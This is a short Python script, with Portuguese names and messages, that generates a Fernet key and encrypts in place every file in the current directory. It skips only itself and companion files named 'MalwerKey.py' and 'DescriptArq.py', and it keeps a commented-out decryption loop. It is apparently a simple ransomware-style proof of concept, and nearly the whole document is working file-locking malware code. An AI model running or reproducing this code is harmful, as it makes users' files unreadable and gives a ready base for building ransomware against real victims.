import os
from cryptography.fernet import Fernet
from pathlib import Path

def generate_key():
    key = Fernet.generate_key()
    with open('chave.key', 'wb') as chave_file:
        chave_file.write(key)
    return key

def load_key():
    return open('chave.key', 'rb').read()

def encrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as arquivo:
            conteudo = arquivo.read()
        conteudo_encrypted = Fernet(key).encrypt(conteudo)
        with open(file_path, 'wb') as arquivo:
            arquivo.write(conteudo_encrypted)
        print(f"Arquivo {file_path} criptografado com sucesso.")
    except Exception as e:
        print(f"Erro ao criptografar o arquivo {file_path}: {e}")

def decrypt_file(file_path, key):
    try:
        with open(file_path, 'rb') as arquivo:
            conteudo_encrypted = arquivo.read()
        conteudo_decrypted = Fernet(key).decrypt(conteudo_encrypted)
        with open(file_path, 'wb') as arquivo:
            arquivo.write(conteudo_decrypted)
        print(f"Arquivo {file_path} descriptografado com sucesso.")
    except Exception as e:
        print(f"Erro ao descriptografar o arquivo {file_path}: {e}")

def main():
    if not Path('chave.key').is_file():
        key = generate_key()
        print("Chave gerada e salva.")
    else:
        key = load_key()
        print("Chave carregada.")

    arquivos = [f for f in Path('.').iterdir() if f.is_file() and f.name not in {'MalwerKey.py', 'chave.key', 'DescriptArq.py'}]
    
    for file_path in arquivos:
        encrypt_file(file_path, key)

    # Para descriptografar, descomente as linhas abaixo
    # for file_path in arquivos:
    #     decrypt_file(file_path, key)

if __name__ == "__main__":
    main()
